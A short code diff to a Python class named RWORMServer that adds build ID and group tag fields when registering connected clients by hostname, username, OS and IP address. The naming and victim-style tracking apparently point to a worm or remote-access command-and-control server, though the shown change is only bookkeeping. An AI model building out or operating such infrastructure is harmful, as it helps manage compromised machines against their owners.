@@ -110,7 +110,8 @@ class RWORMServer:
                     self.clients[session.id] = session
                 self.db.add_client(
                     session.guid, session.hostname,
-                    session.username, session.os_version, session.ip_address)
+                    session.username, session.os_version, session.ip_address,
+                    session.build_id, session.group_tag)
                 print(f"[+] Client identified: {session.hostname} ({session.username}) guid={session.guid[:8]}... @ {session.ip_address}", flush=True)
                 self._broadcast_client_list()
             except Exception as e:
